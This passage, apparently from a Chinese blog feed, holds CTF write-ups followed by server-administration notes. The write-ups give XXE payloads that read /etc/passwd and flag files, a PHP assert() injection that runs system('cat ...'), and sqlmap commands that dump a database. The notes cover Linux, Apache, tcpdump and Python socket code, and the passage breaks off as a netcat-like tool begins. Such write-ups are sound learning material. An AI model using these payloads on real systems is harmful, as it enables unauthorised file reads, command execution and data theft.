  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  这段代码与上面的只有两行不一样</p>
<ul>
<li><p><code>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</code></p>
</li>
<li><p><code>&lt;description&gt;&amp;xxe;&lt;/description&gt;</code><br>其中<code>&amp;xxe</code>就是恶意引用了外部的文件(实体):<code>file:///etc/passwd</code></p>
<br>
这份数据包如果发送给服务器, 代码被解释并返回

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...&#125;</span><br></pre></td></tr></table></figure>

<p>“无意”中就把文件的内容泄漏出来了.</p>
<br>
以上就是通过直接DTD外部实体声明实现的xxe. 理论上可以实现任意文件读取.

<p>不过这一切的前提是, <strong>允许对外部实体的引用</strong></p>
</li>
</ul>
</li>
</ul>
<p>好的, 前期知识基础的铺垫就先这么多.<br>回到刚才的题目上来, 我们查看下index.php的源代码, 有这么一段 js 代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>emmm, 这段代码有太多我陌生的方法了(主要是因为没学过js), 全面的理解对解题来说性价比太低了.<br>不过如果能捕捉到其中的关键字<code>XML</code>我想对解题应该能起到一个很好的提示作用吧.<br>总之, 假设我们现在已经知道这道题目是有xxe漏洞的, 那么就可以用刚才的方法读取flag文件!<br><br><br>点击题目的那个<code>GO</code><br>用<code>Burp Suite</code>抓包. 发现是<code>POST</code>方法, body中有一段json格式的代码. 弃之.<br>我们要传xml的数据.<br>所以首先把<code>Content-Type</code>改成<code>application/xml</code><br>再在<code>body</code>中构造如下payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE abcd[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span>&amp;any;<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终效果图 :</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/xxe.png" alt title class>
                <p></p>
            </figure>
<p>ojbk.</p>
<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002" target="_blank" rel="noopener">mfw</a>(resolved)</p>
<p>在题目中看到了出题者使用了Git, 可以猜测是Source Leak, 使用GitHack脚本, 能下载部分源代码.</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/GitHack.png" alt title class>
                <p></p>
            </figure>

<p>其实一开始以为要用目录扫描工具, 顺便记录下目录扫描的方法, 可以用Kali自带的<code>dirbuster</code>, 也可以用Github上的开源工具<code>dirsearch</code>.<br>这里推荐用后者, 因为它简单易用且十分强大.<br><strong>使用方法</strong> : <code>python dirsearch.py -u [URL] -e *</code></p>
<p>言归正传<br>在下载下的目录中看到有个<code>\templates\flag.php</code>, 进去后写着TODO, 这其实给了我们提示, <strong>要想办法读取这个flag.php</strong>.</p>
<p>再来审计index.php的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br></pre></td></tr></table></figure>

<p>直接上构造好的payload:<code>&#39;,&#39;yjn&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>把我们的payload代入进去:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"','yjn') or system('cat ./templates/flag.php');//"</span>;</span><br><span class="line">$file = templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php</span></span><br><span class="line"><span class="string">assert("strpos('</span>templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是, <code>//</code>在这里起到了注释的作用, 但是只注释到assert的括号内.<br>所以这条语句就成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/','yjn') or system('cat ./templates/flag.php');"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>再把<code>assert()</code>去除掉</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="string">'templates/'</span>,<span class="string">'yjn'</span>) <span class="keyword">or</span> </span><br><span class="line">system(<span class="string">'cat ./templates/flag.php'</span>) <span class="keyword">or</span> </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>这条语句由三个小语句组成, 并用<code>or</code>连接了起来, 依此编号 1 2 3.<br>那么, 为了得到flag, 我们希望执行<code>语句2</code>,而不希望执行其它语句.<br>所以这里其实是利用了<code>or</code>的<code>短路效应</code>.</p>
<ul>
<li><code>语句1</code> : <code>strpos()</code>函数为查找字串, 但是显然<code>templates/flag.php</code>中没有<code>yjn</code>这个子串, 所以会有个返回值0. <code>or</code>会继续往下执行.</li>
<li><code>语句2</code> : 使系统执行命令<code>cat ./templates/flag.php</code>, 这条命令不光会让我们成功的拿到了flag, 还会返回<code>TRUE</code>, <code>or</code>就不会执行<code>语句3</code>. 如果命令执行不成功, 也会有个<code>FLASE</code>的返回值, 这曾一度给我很大的困扰.</li>
</ul>
<p>最终</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/mfw.png" alt title class>
                <p></p>
            </figure>

<h3 id="NewCenter-solved"><a href="#NewCenter-solved" class="headerlink" title="NewCenter(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686" target="_blank" rel="noopener">NewCenter(solved)</a></h3><p>进入题目是个类似新闻网站的页面, 下面有个搜索框.<br>可以sql注入.<br>但是我现在的sql注入技术还是菜啊, 所以就用<code>sqlmap</code>吧, 记录下~</p>
<p>因为<code>sqlmap</code>要求<code>python2</code>运行, 所以我这里是用的<code>Kali</code>下自带的</p>
<p>首先把搜索的请求包抓取, 将其内容放进一个<code>txt</code>文件中</p>
<p>使用命令<code>sqlmap   -r 1.txt --dbs</code><br>可以将表的名字列出, 发现有个<code>news</code><br>再使用命令<code>sqlmap   -r 1.txt -D news --dump</code><br>就能将这个表的内容全部显示出来<br>get flag~</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ext3-solved"><a href="#ext3-solved" class="headerlink" title="ext3(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5098" target="_blank" rel="noopener">ext3(solved)</a></h3><ul>
<li>重点 :<ul>
<li>ext3 文件系统</li>
<li>strings</li>
<li>文件系统的挂载/卸载</li>
</ul>
</li>
</ul>
<p>附件是个名为<code>linux</code>的文件,<br>扔进 Linux 里,<code>file linux</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>

<p>可以看出是Linux文件系统<code>ext3</code>, 我们要找的<code>flag</code>应该就藏在这个文件里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# string linux | grep &apos;flag&apos;</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>

<p>但是要读取这个<code>flag.txt</code>,需要我们把文件系统挂载到Linux系统下.<br><code>mount linux /mnt</code><br>现在 <code>/mnt</code>目录就是挂载点.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure>

<p><code>base64</code> decode后就是flag<br>最后可以使用 <code>umount [挂载点]</code>来卸载文件系统.</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[服务器运维]]></title>
      <url>/2019/07/08/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
      <content type="html"><![CDATA[<h1 id="服务器相关笔记"><a href="#服务器相关笔记" class="headerlink" title="服务器相关笔记"></a>服务器相关笔记</h1><h2 id="服务器参数"><a href="#服务器参数" class="headerlink" title="服务器参数:"></a>服务器参数:</h2><ul>
<li>Ubunt 18.04 Server</li>
<li>内存 2GB</li>
</ul>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>新建文件 <code>touch &lt;name&gt;</code><br>删除文件 <code>rm   &lt;name&gt;</code><br>删除目录 <code>rm -r   &lt;name&gt;</code><br>解压缩 <code>unzip  &lt;name&gt;</code><br>文件复制 <code>cp 源文件 目标目录</code><br>文件移动 <code>mv 源文件 目标目录</code></p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译C++程序(指定名称和后缀):<br><code>g++   *.cpp   -std=c++11 -o   a.exe</code></p>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤出文件中包含 <code>key</code>的记录 :<br><code>grep &#39;key&#39; &lt;file&gt;</code><br>递归过滤 :<br><code>grep -r &#39;key&#39; &lt;file&gt;</code></p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>作用 ：将上一个命令的输出作为下一个命令的输入, 操作符是 |</p>
<ol>
<li>将 cat 和 grep 组合在一起<br><code>cat &lt;file&gt; | grep &#39;key&#39;</code></li>
<li>过滤出目录中名字包含<code>key</code>的目录(不包含子目录)<br><code>ls | grep &#39;key&#39;</code></li>
</ol>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul>
<li>显示所有进程<br><code>ps -A</code></li>
<li>杀死某项进程<br><code>sudo kill [进程编号]</code></li>
</ul>
<h2 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h2><table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>screen -S &lt;name&gt;</code></td>
<td align="center">创建名为 name 的session</td>
</tr>
<tr>
<td align="center"><code>screen  -ls</code></td>
<td align="center">显示所有session</td>
</tr>
<tr>
<td align="center"><code>screen  -r  &lt;name&gt;</code></td>
<td align="center">进入名为 name 的session</td>
</tr>
<tr>
<td align="center"><code>screen   -D  -r  &lt;name&gt;</code></td>
<td align="center">将名为name的session离线并重新连接</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>ctrl+a     c</code></td>
<td align="center">在当前终端新建session</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     w</code></td>
<td align="center">显示当前终端session列表</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     k</code></td>
<td align="center">关闭当前session</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     0-9</code></td>
<td align="center">显示0-9session</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     space</code></td>
<td align="center">按照顺序显示下一个session</td>
</tr>
<tr>
<td align="center"><code>ctrl+a     A</code></td>
<td align="center">为当前session命名</td>
</tr>
<tr>
<td align="center">若要关闭某个session，则关闭该session下所有window</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><code>screen   -D  -r  &lt;name&gt;</code>可解决某些情况下无法重连接终端的问题</li>
<li>若要关闭某个session，则关闭该session下所有window即可</li>
</ul>
<h2 id="使用pscp从本地上传文件"><a href="#使用pscp从本地上传文件" class="headerlink" title="使用pscp从本地上传文件"></a>使用pscp从本地上传文件</h2><blockquote>
<p>更推荐使用 finalShell 类的工具,非常方便,省去打命令的时间,且更直观</p>
</blockquote>
<p>步骤:</p>
<ol>
<li>从本地打开<code>CMD</code>到（pscp）putty目录下</li>
<li>pscp</li>
<li>基本命令格式：<br><code>pscp   [本地文件路径]   [用户名]@[ServerIP]:[目录]</code><br>或<code>pscp  -r   [本地目录路径]  [用户名]@[ServerIP]：[目录]</code><br>同理，pscp也可以从Linux向Windows复制文件或目录</li>
</ol>
<h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法:"></a>通用方法:</h4><ul>
<li>启动:<code>/usr/local/apache2/bin/apachectl start apaceh</code></li>
<li>停止:<code>/usr/local/apache2/bin/apachectl stop</code></li>
<li>重启:<code>/usr/local/apache2/bin/apachectl restart</code></li>
<li>重启但不中断当前连接:<code>/usr/local/sbin/apachectl graceful</code><h4 id="作为Linux的服务时"><a href="#作为Linux的服务时" class="headerlink" title="作为Linux的服务时:"></a>作为Linux的服务时:</h4></li>
<li>启动: <code>service httpd start 启动</code></li>
<li>重新启动:<code>service httpd restart</code></li>
<li>停止:<code>service httpd stop</code><h4 id="Ubuntu系统下"><a href="#Ubuntu系统下" class="headerlink" title="Ubuntu系统下:"></a>Ubuntu系统下:</h4></li>
<li>启动: <code>$ sudo /etc/init.d/apache2 start</code></li>
<li>重新启动: <code>$ sudo /etc/init.d/apache2 restart</code></li>
<li>停止: <code>$ sudo /etc/init.d/apache2 stop</code><h4 id="其它"><a href="#其它" class="headerlink" title="其它:"></a>其它:</h4>在配置完成apache2.conf 文件以达到禁止访问目录的目的后, 我重新启动apache2服务, 但是却显示apache2.conf文件语法错误<blockquote>
<p>Invalid Mutex directory in argument file:${APACHE_LOCK_DIR}</p>
</blockquote>
</li>
</ul>
<p>然而这里的部分我没有任何改动.<br>使用如下命令可以避免报错, 直接启动<br><code>sudo apachectl restart</code><br>原理至今不明.</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><code>/etc/apache2/apache2.conf</code></p>
<h2 id="MineCraft相关命令"><a href="#MineCraft相关命令" class="headerlink" title="MineCraft相关命令"></a>MineCraft相关命令</h2><ul>
<li><p>mine craft启动命令（其他jar类型的程序应该也可以如此启动）<br><code>java -Xms# -Xmx# -jar [path]/minecraft_server.[version].jar nogui</code><br><code>nogui</code>:表示不以图形界面运行,因为我的服务器是server版的,本身就没有图形界面,所以不加也可以<br><code>-Xms</code>:初始启动分配内存<br><code>-Xmx</code>:最大分配内存<br><code>path</code>:jar包所在路径<br><code>version</code>:当前MineCraft_Server版本</p>
</li>
<li><p><code>tell &lt;sb&gt; &lt;something&gt;</code>: 给sb 私信 </p>
</li>
<li><p><code>gamemode survival &lt;sb&gt;</code>:将 sb 调至 生存模式</p>
</li>
<li><p><code>gamemode create &lt;sb&gt;</code>:将sb 调至 创造模式</p>
</li>
</ul>
<h2 id="tshark-使用"><a href="#tshark-使用" class="headerlink" title="tshark 使用"></a>tshark 使用</h2><p><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
<ul>
<li>显示可用网卡 <code>tshark -D</code></li>
<li>抓包  使用命令 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 `tcpdump` 的方法</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+ -s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</span><br><span class="line">+ -w 输入到文件</span><br><span class="line">+ port 监听的端口</span><br><span class="line"></span><br><span class="line">**使用 tcpdump 同样需要sudo**</span><br><span class="line"></span><br><span class="line">## python 脚本</span><br><span class="line"></span><br><span class="line">### TCP客户端</span><br><span class="line">```py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target_host = &quot;188.131.227.20&quot;</span><br><span class="line">target_port =  9999   #与服务端保持一致</span><br><span class="line"></span><br><span class="line">#create a object named client</span><br><span class="line">client = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</span><br><span class="line">#connect server and client</span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line">#sent data to server</span><br><span class="line">client.send(&quot;hello world&quot;)</span><br><span class="line">#recevice data from server</span><br><span class="line">response = client.recv(4096)</span><br><span class="line"></span><br><span class="line">print response</span><br></pre></td></tr></table></figure>

<h3 id="TCP服务端"><a href="#TCP服务端" class="headerlink" title="TCP服务端"></a>TCP服务端</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip = <span class="string">"0.0.0.0"</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">server.bind((bind_ip , bind_port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Listening on %s:%d"</span> % (bind_ip , bind_port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">( client_socket )</span>:</span></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Received: %s"</span> % request</span><br><span class="line">    </span><br><span class="line">    client_socket.send(<span class="string">"ACK!"</span>)</span><br><span class="line">    </span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client , addr = server.accept()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Accepted connection from: %s:%d"</span> % (addr[<span class="number">0</span>] , addr[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    client_handler = threading.Thread(target=handle_client , args=(client, ))</span><br><span class="line">    </span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure>

<h3 id="仿-netcat-的脚本工具-—-BHP-Net-Tool"><a href="#仿-netcat-的脚本工具-—-BHP-Net-Tool" class="headerlink" title="仿 netcat 的脚本工具 — BHP Net Tool"></a>仿 netcat 的脚本工具 — BHP Net Tool</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 